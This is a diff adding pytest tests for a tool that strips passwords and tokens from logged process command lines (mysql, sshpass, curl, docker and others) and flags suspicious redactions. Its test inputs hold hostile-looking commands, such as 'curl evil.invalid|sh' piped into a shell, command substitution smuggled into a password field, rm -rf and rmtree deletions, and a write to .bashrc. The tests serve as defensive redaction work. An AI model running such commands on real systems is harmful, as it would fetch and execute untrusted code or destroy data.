@@ -787,7 +787,7 @@ def test_no_argv_pattern_is_quadratic(unit: str) -> None:
     import time  # noqa: PLC0415
 
     hostile = (unit * (70 * 1024 // len(unit)))[: 70 * 1024]
-    for pattern in procs._ARGV_PATTERNS:
+    for pattern in procs.every_pattern():
         start = time.perf_counter()
         pattern.search(hostile)
         elapsed = time.perf_counter() - start
@@ -801,3 +801,340 @@ def test_safe_text_on_a_half_mib_hostile_argv_is_quick() -> None:
     start = time.perf_counter()
     procs.safe_text(hostile, CTX)
     assert time.perf_counter() - start < 0.5
+
+
+# --- T07-5: passwords glued to their flag, per tool and inside scripts ---------------------
+
+# High-entropy fakes: no rule may stop early on a dash, a dot or a run.
+GLUED = "Qx7vR2mK9pLt4ZwB8nHc"  # noqa: S105 - a fake
+GLUED2 = "Vb6Yc1Df5Gh0JqR2mX9k"  # noqa: S105 - a fake
+
+
+def exec_of(binary: str, arguments: str, flags: str = "execve clone") -> Record:
+    data = with_arguments(arguments)
+    data["process_exec"]["process"]["binary"] = binary
+    data["process_exec"]["process"]["flags"] = flags
+    result = classify(data, CTX)
+    assert isinstance(result, Record), result
+    return result
+
+
+@pytest.mark.parametrize(
+    ("binary", "arguments", "kept"),
+    [
+        ("/usr/bin/mysql", f"-uroot -p{GLUED} shop", "-uroot"),
+        ("/usr/bin/mysql", f"-h db.invalid -p{GLUED} -e 'select 1'", "select 1"),
+        ("/usr/bin/mysqldump", f"-uroot -p{GLUED} shop", "shop"),
+        ("/usr/bin/mariadb", f"--user=root -p{GLUED} shop", "--user=root"),
+        ("/usr/bin/mariadb-dump", f"-p{GLUED} --all-databases", "--all-databases"),
+        ("/usr/bin/mysql", f'"-p{GLUED} {GLUED2}" shop', "shop"),  # Tetragon-quoted element
+        ("/usr/bin/sshpass", f"-p {GLUED} ssh user@host.invalid", "ssh user@host.invalid"),
+        ("/usr/bin/sshpass", f"-p{GLUED} ssh user@host.invalid", "ssh user@host.invalid"),
+        ("/usr/bin/sshpass", f'-p "{GLUED} {GLUED2}" ssh host.invalid', "ssh host.invalid"),
+        ("/usr/bin/redis-cli", f"-h cache.invalid -a {GLUED} ping", "ping"),
+        ("/usr/bin/redis-cli", f"-a{GLUED} --no-auth-warning get k", "get k"),
+        ("/usr/bin/mongosh", f"-u admin -p {GLUED} --authenticationDatabase admin", "-u admin"),
+        ("/usr/bin/mongodump", f"-u admin -p{GLUED} --db shop", "--db shop"),
+        ("/usr/bin/lftp", f"-u alice,{GLUED} sftp://host.invalid", "sftp://host.invalid"),
+        ("/usr/bin/smbclient", f"//host.invalid/share -U alice%{GLUED}", "//host.invalid/share"),
+        ("/usr/bin/smbclient", f"//h.invalid/s --user=alice%{GLUED} -c ls", "-c ls"),
+        ("/usr/bin/curl", f"-ualice:{GLUED} https://example.invalid/", "https://example.invalid"),
+        ("/usr/bin/curl", f"-U proxy:{GLUED} https://example.invalid/", "https://example.invalid"),
+        ("/usr/bin/curl", f"--oauth2-bearer {GLUED} https://x.invalid/", "https://x.invalid/"),
+        ("/usr/bin/wget", f"--password={GLUED} https://x.invalid/", "https://x.invalid/"),
+        ("/usr/bin/wget", f"--http-password {GLUED} https://x.invalid/", "https://x.invalid/"),
+        ("/usr/bin/wget", f"--ftp-password={GLUED} ftp://x.invalid/", "ftp://x.invalid/"),
+        ("/usr/bin/psql", f"postgresql://alice:{GLUED}@db.invalid/shop", "db.invalid/shop"),
+        ("/usr/bin/psql", f'"host=db.invalid password={GLUED} dbname=shop"', "dbname=shop"),
+        ("/usr/bin/ftp", f"ftp://alice:{GLUED}@ftp.invalid/", "ftp.invalid"),
+        ("/usr/bin/openssl", f"enc -aes256 -pass pass:{GLUED} -in f", "-in f"),
+    ],
+)
+def test_a_tool_password_glued_or_spaced_is_struck(binary: str, arguments: str, kept: str) -> None:
+    argv = exec_of(binary, arguments).details["argv"]
+    assert GLUED not in argv and GLUED2 not in argv, argv
+    assert kept in argv, argv
+
+
+@pytest.mark.parametrize(
+    ("arguments", "kept"),
+    [
+        (f'-c "mysql -uroot -p{GLUED} shop; ls /w"', "ls /w"),
+        (f"-c \"/usr/bin/mysql -p'{GLUED} {GLUED2}' shop && echo ok\"", "echo ok"),
+        (f'-c "cd /w && mariadb -p"{GLUED}" shop"', "cd /w"),
+        (f'-c "MYSQL_PWD={GLUED} mysql shop"', "mysql shop"),
+        (f'-c "PGPASSWORD={GLUED} psql -h db.invalid"', "psql -h db.invalid"),
+        (f'-c "SSHPASS={GLUED} sshpass -e ssh host.invalid"', "ssh host.invalid"),
+        (f'-c "REDISCLI_AUTH={GLUED} redis-cli ping"', "redis-cli ping"),
+        (f'-c "sshpass -p {GLUED} ssh host.invalid && echo ok"', "echo ok"),
+        (f'-c "redis-cli -a {GLUED} ping | cat"', "| cat"),
+        (f'-c "mongosh -u a -p {GLUED} | tee x"', "tee x"),
+        (f'-c "lftp -u alice,{GLUED} host.invalid; echo done"', "echo done"),
+        (f'-c "smbclient //h.invalid/s -U alice%{GLUED} -c ls"', "-c ls"),
+        (f"-c \"x=$(mysql -N -p{GLUED} -e 'select 1'); echo $x\"", "echo $x"),
+        (f"-c 'import os; os.system(\"mysql -p{GLUED} shop\")'", "import os"),
+    ],
+)
+def test_a_tool_password_inside_a_script_is_struck(arguments: str, kept: str) -> None:
+    argv = exec_of("/bin/sh", arguments).details["argv"]
+    assert GLUED not in argv and GLUED2 not in argv, argv
+    assert kept in argv, argv
+
+
+@pytest.mark.parametrize(
+    ("binary", "arguments", "kept"),
+    [
+        # Bounded to the tool's own command: a -p of the next one is not a password.
+        ("/bin/sh", '-c "mysql shop; mkdir -pnew /w/x"', "mkdir -pnew /w/x"),
+        ("/bin/sh", '-c "mysql -p; rm -rf /w"', "rm -rf /w"),
+        ("/bin/sh", "-c 'git checkout -b x && rm -rf /w'", "rm -rf /w"),
+        ("/bin/sh", '-c "mkdir -p /w/x && mysqlfoo.sh -pkeep"', "mysqlfoo.sh -pkeep"),
+        ("/usr/bin/ssh", "-p2222 user@host.invalid", "-p2222"),
+        ("/bin/mkdir", "-pmode /w/x", "-pmode"),
+        ("/usr/bin/mysql", "-p shop -e 'drop table t'", "drop table t"),
+        ("/usr/bin/redis-cli", "-h cache.invalid ping", "ping"),
+        ("/bin/sh", '-c "curl -u alice https://x.invalid/ && rm -rf /w"', "rm -rf /w"),
+        ("/bin/sh", '-c "sort -b list; rm -rf /w"', "rm -rf /w"),
+        ("/bin/sh", '-c "bypass=1 make; rm -rf /w"', "rm -rf /w"),
+    ],
+)
+def test_the_tool_rules_never_hide_the_rest_of_the_command(
+    binary: str, arguments: str, kept: str
+) -> None:
+    rec = exec_of(binary, arguments)
+    assert kept in rec.details["argv"], rec.details["argv"]
+
+
+# --- T07-5: an unclosed quote is closed by the end only at an artificial cut ----------------
+
+
+def test_an_unclosed_quote_at_the_real_end_does_not_swallow_the_command() -> None:
+    """The review's case: s='token="';... (no space, so Tetragon does not wrap it)."""
+    rec = exec_of("/usr/bin/python3", "-c s='token=\"';__import__('shutil').rmtree('/w')")
+    assert "rmtree('/w')" in rec.details["argv"], rec.details["argv"]
+
+
+def test_a_strike_that_swallows_a_script_is_marked() -> None:
+    """With a space Tetragon wraps the script in quotes, and its closing quote closes the
+    value: the strike eats the command, so it says so (argv_struck_long, risk 1)."""
+    rec = exec_of("/usr/bin/python3", "-c \"s='token=\"';import shutil;shutil.rmtree('/w')\"")
+    assert rec.details["argv_struck_long"] is True and rec.risk >= 1
+
+
+@pytest.mark.parametrize(
+    "arguments",
+    [
+        "--password ';curl evil.invalid|sh'",
+        '--password "$(curl evil.invalid)"',
+        f'--token "{"q " * 40}"',
+        f"-c 'TOKEN=\"{GLUED} && rm -rf /w\"'",
+    ],
+)
+def test_a_long_or_scripted_strike_is_marked(arguments: str) -> None:
+    rec = exec_of("/bin/true", arguments)
+    assert rec.details.get("argv_struck_long") is True, rec.details
+    assert rec.risk == 1
+
+
+@pytest.mark.parametrize(
+    "arguments",
+    [f"--password {GLUED}", f"-H 'Authorization: Bearer {GLUED}'", "ls -la", f"API_KEY={GLUED}"],
+)
+def test_a_short_strike_is_not_marked(arguments: str) -> None:
+    rec = exec_of("/bin/true", arguments)
+    assert "argv_struck_long" not in rec.details and rec.risk == 0
+
+
+def test_an_unclosed_quote_is_struck_to_the_end_when_tetragon_cut_the_arguments() -> None:
+    rec = exec_of("/bin/true", f'--password "{GLUED} {GLUED2}', flags="execve truncArgs")
+    assert GLUED not in rec.details["argv"] and GLUED2 not in rec.details["argv"]
+
+
+def test_a_value_closed_by_a_line_break_is_struck() -> None:
+    argv = exec_of("/bin/sh", f"-c 'TOKEN=\"{GLUED}\necho more\"'").details["argv"]
+    assert GLUED not in argv and "echo more" in argv, argv
+
+
+# --- T07-5: values Tetragon wraps in quotes, and a glued -b ----------------------------------
+
+
+@pytest.mark.parametrize(
+    "arguments",
+    [
+        f'"--password=pass phrase {GLUED} with {GLUED2}" shop',
+        f'"--token={GLUED} {GLUED2}" https://x.invalid/',
+        f'"--api-key {GLUED} {GLUED2}" https://x.invalid/',
+        f"-bsessionid={GLUED};csrftoken={GLUED2} https://x.invalid/",
+        f'"-bsessionid={GLUED}; csrftoken={GLUED2}" https://x.invalid/',
+        f'-b"sessionid={GLUED}; csrftoken={GLUED2}" https://x.invalid/',
+    ],
+)
+def test_a_value_tetragon_wrapped_in_quotes_is_struck_to_its_close(arguments: str) -> None:
+    argv = exec_of("/usr/bin/curl", arguments).details["argv"]
+    assert GLUED not in argv and GLUED2 not in argv, argv
+    assert "x.invalid" in argv or "shop" in argv or "run" in argv
+
+
+def test_env_with_an_assignment_tetragon_wrapped_is_struck_to_its_close() -> None:
+    argv = exec_of("/usr/bin/env", f'"DB_PASSWORD={GLUED} {GLUED2}" run').details["argv"]
+    assert GLUED not in argv and GLUED2 not in argv and argv.endswith("run"), argv
+    # The same shape inside a script is a command, and stays in sight.
+    argv = exec_of("/bin/sh", f'-c "PGPASSWORD={GLUED} psql -h db.invalid"').details["argv"]
+    assert GLUED not in argv and "psql -h db.invalid" in argv, argv
+
+
+# --- T07-5: the low ones ---------------------------------------------------------------------
+
+
+def test_an_escaped_quote_inside_a_json_value_does_not_end_it() -> None:
+    argv = argv_of(f'-d \'{{"api_key": "ab\\"{GLUED}", "x": 1}}\'')
+    assert GLUED not in argv, argv
+
+
+def test_a_jwt_with_a_payload_over_4_kib_is_struck() -> None:
+    payload = "eyJ" + ("Ab3dE6gH9" * 600)
+    token = f"eyJhbGciOiJIUzI1NiJ9.{payload}.{GLUED}"
+    argv = argv_of(f"-H x {token} done")
+    assert "Ab3dE6gH9Ab3dE6gH9" not in argv and GLUED not in argv, argv
+
+
+def test_a_fake_key_end_cannot_strike_short_lines_before_it() -> None:
+    lines = "\n".join(["cd", "whoami", "reboot", "ls"])
+    arguments = "-c '" + "x " * 3000 + "\n" + lines + "\n-----END RSA PRIVATE KEY-----'"
+    argv = argv_of(arguments)
+    assert "whoami" in argv and "reboot" in argv, argv
+
+
+def test_a_real_key_body_before_its_end_is_still_struck() -> None:
+    body = "\n".join((_B64 * 2)[i : i + 64] for i in range(0, 64 * 4, 64)) + "\nAB12=="
+    arguments = "-c '" + "x " * 3000 + "\n" + body + "\n-----END RSA PRIVATE KEY-----'"
+    assert _B64[:20] not in argv_of(arguments)
+
+
+# --- T07-5: the cost of every new or changed pattern -----------------------------------------
+
+
+@pytest.mark.parametrize(
+    "unit",
+    [
+        "a.", "-p", "-p'", '-p"', "mysql -p", "mysql ", 'mysql -p"', "mysql -p'a ",
+        "sshpass -p ", "redis-cli -a ", "lftp -u a,", "-U a%", "-ua:", "MYSQL_PWD=",
+        '"--password=', '"-b', "-ba=", '"-ba=', "TOKEN=\"a\n", '"api_key": "\\"',
+        "eyJa.eyJ", "eyJ-", "A" * 40 + "\n", "pass:", "a b ", "x://",
+        '"--user=a:', "--user=a", "-U a", "lftp -u a", "scott/", "a/", "config set ",
+        "identified by '", "password '", "docker login -p ", "-nb a ", "-b a b c ", '-u "a:',
+        "-u 'a:", 'sudo mysql "-p', "/p:", "secretsecret",
+    ],
+)  # fmt: skip
+def test_the_t07_5_patterns_are_linear(unit: str) -> None:
+    import time  # noqa: PLC0415
+
+    hostile = (unit * (70 * 1024 // len(unit)))[: 70 * 1024]
+    for binary in (
+        "/usr/bin/mysql", "/usr/bin/sshpass", "/usr/bin/lftp", "/bin/sh", "/usr/bin/curl",
+        "/usr/bin/smbclient", "/usr/sbin/htpasswd", "/usr/bin/sqlplus", "/usr/bin/docker",
+    ):  # fmt: skip
+        start = time.perf_counter()
+        procs._strike_patterns(hostile, tool=procs._tool_of(binary), open_end=True)
+        elapsed = time.perf_counter() - start
+        assert elapsed < 0.05 * 4, f"{binary} took {elapsed:.3f}s on {unit!r}"
+    for pattern in procs.every_pattern():
+        start = time.perf_counter()
+        pattern.sub("", hostile)
+        procs._strike_key_bodies(hostile)
+        elapsed = time.perf_counter() - start
+        assert elapsed < 0.05, f"{pattern.pattern[:50]!r} took {elapsed:.3f}s on {unit!r}"
+
+
+# --- T07-5 review: more tools, values with spaces, connections ------------------------------
+
+
+@pytest.mark.parametrize(
+    ("binary", "arguments", "kept"),
+    [
+        ("/usr/bin/podman", f"login -u me -p {GLUED} registry.invalid", "registry.invalid"),
+        ("/usr/bin/docker", f"login -u me -p{GLUED} registry.invalid", "registry.invalid"),
+        ("/usr/bin/helm", f"registry login -u me -p {GLUED} r.invalid", "r.invalid"),
+        ("/usr/bin/ldapsearch", f"-x -D cn=admin -w {GLUED} -b dc=x", "cn=admin"),
+        ("/usr/bin/sqlcmd", f"-S db.invalid -U sa -P {GLUED} -Q 'select 1'", "select 1"),
+        ("/usr/bin/ipmitool", f"-H bmc.invalid -U admin -P {GLUED} power status", "power status"),
+        ("/usr/bin/mosquitto_pub", f"-u me -P {GLUED} -t t -m hi", "-t t"),
+        ("/usr/bin/zip", f"-P {GLUED} out.zip a.txt", "out.zip"),
+        ("/usr/bin/unzip", f"-P {GLUED} in.zip", "in.zip"),
+        ("/usr/bin/7z", f"a -p{GLUED} out.7z a.txt", "out.7z"),
+        ("/usr/bin/openssl", f"enc -aes-256-cbc -k {GLUED} -in f", "-in f"),
+        ("/usr/bin/ssh-keygen", f"-t ed25519 -N {GLUED} -f key", "-f key"),
+        ("/usr/bin/curl", f"-E cert.pem:{GLUED} https://x.invalid/", "https://x.invalid/"),
+        ("/usr/bin/curl", f"--cert cert.pem:{GLUED} https://x.invalid/", "https://x.invalid/"),
+        ("/usr/bin/sqlplus", f"scott/{GLUED}@orcl @run.sql", "@run.sql"),
+        ("/usr/bin/gh", f"secret set TOKEN_X --body {GLUED}", "secret set"),
+        ("/usr/bin/vault", f"login {GLUED}", "login"),
+        ("/usr/sbin/htpasswd", f"-b /etc/pw alice {GLUED}", "alice"),
+        ("/usr/sbin/htpasswd", f"-nb alice {GLUED}", "alice"),
+        ("/usr/bin/nmcli", f"dev wifi connect home password {GLUED}", "connect home"),
+        ("/usr/bin/xfreerdp", f"/v:h.invalid /u:me /p:{GLUED}", "/u:me"),
+        ("/usr/bin/aws", f"configure set aws_secret_access_key {GLUED}", "configure set"),
+        ("/usr/bin/npm", f"config set //r.invalid/:_authToken {GLUED}", "config set"),
+        ("/usr/bin/mysql", f"-e \"CREATE USER u IDENTIFIED BY '{GLUED}'\"", "CREATE USER u"),
+        ("/usr/bin/psql", f"-c \"ALTER USER u WITH PASSWORD '{GLUED}'\"", "ALTER USER u"),
+        # Values with spaces, wrapped by Tetragon, after flags that name no secret word.
+        ("/usr/bin/curl", f'-u "alice:pw {GLUED}" https://x.invalid/', "https://x.invalid/"),
+        ("/usr/bin/curl", f'--user "alice:pw {GLUED}" https://x.invalid/', "x.invalid"),
+        ("/usr/bin/curl", f'"--user=alice:pw {GLUED}" https://x.invalid/', "x.invalid"),
+        ("/usr/bin/curl", f'--proxy-user "a:pw {GLUED}" https://x.invalid/', "x.invalid"),
+        ("/usr/bin/smbclient", f'//h/s --user "bob%pw {GLUED}"', "//h/s"),
+        ("/usr/bin/sudo", f'mysql "-ppw {GLUED}" shop', "shop"),
+        ("/bin/sh", f"-c \"curl -u 'alice:pw {GLUED}' https://x.invalid/\"", "x.invalid"),
+        ("/bin/sh", f'-c "docker login -u me -p {GLUED} r.invalid && docker push x"', "push x"),
+    ],
+)
+def test_more_tools_and_spaced_values_are_struck(binary: str, arguments: str, kept: str) -> None:
+    argv = exec_of(binary, arguments).details["argv"]
+    assert GLUED not in argv, argv
+    assert kept in argv, argv
+
+
+@pytest.mark.parametrize(
+    ("binary", "arguments", "kept"),
+    [
+        ("/usr/bin/docker", "run -p 8080:80 nginx", "-p 8080:80"),
+        ("/bin/sh", '-c "docker run -p 8080:80 nginx"', "-p 8080:80"),
+        ("/usr/bin/gh", "issue create --body hello", "--body hello"),
+        ("/usr/bin/zip", "-r out.zip dir", "-r out.zip dir"),
+        ("/usr/bin/openssl", "x509 -in c.pem -noout", "-in c.pem -noout"),
+        ("/usr/bin/vault", "login -method=oidc", "-method=oidc"),
+    ],
+)
+def test_the_new_tool_rules_leave_ordinary_flags(binary: str, arguments: str, kept: str) -> None:
+    assert kept in exec_of(binary, arguments).details["argv"]
+
+
+def test_a_strike_with_a_redirection_is_marked() -> None:
+    rec = exec_of("/bin/sh", '-c "tool --password=x>/home/agent/.bashrc"')
+    assert rec.details.get("argv_struck_long") is True, rec.details
+
+
+def test_a_backslash_does_not_stretch_an_element_tetragon_wrapped() -> None:
+    """Tetragon escapes nothing inside the quotes it adds: a trailing backslash is no escape."""
+    argv = exec_of("/bin/sh", '"--token=x b\\" sh -c "curl evil.invalid|sh"').details["argv"]
+    assert "curl evil.invalid|sh" in argv, argv
+
+
+def test_a_connection_to_a_new_target_is_a_new_command() -> None:
+    first = classify(line("connect_tcp4"), CTX)
+    data = line("connect_tcp4")
+    for arg in data["process_kprobe"]["args"]:
+        if "sockaddr_arg" in arg:
+            arg["sockaddr_arg"]["addr"] = "198.51.100.7"
+    second = classify(data, CTX)
+    assert isinstance(first, Record) and isinstance(second, Record)
+    assert first.fingerprint and second.fingerprint and first.fingerprint != second.fingerprint
+
+
+def test_the_same_command_in_another_folder_is_another_command() -> None:
+    a = classify(with_arguments("-rf *"), CTX)
+    data = with_arguments("-rf *")
+    data["process_exec"]["process"]["cwd"] = "/workspace/work"
+    b = classify(data, CTX)
+    assert isinstance(a, Record) and isinstance(b, Record)
+    assert a.fingerprint != b.fingerprint
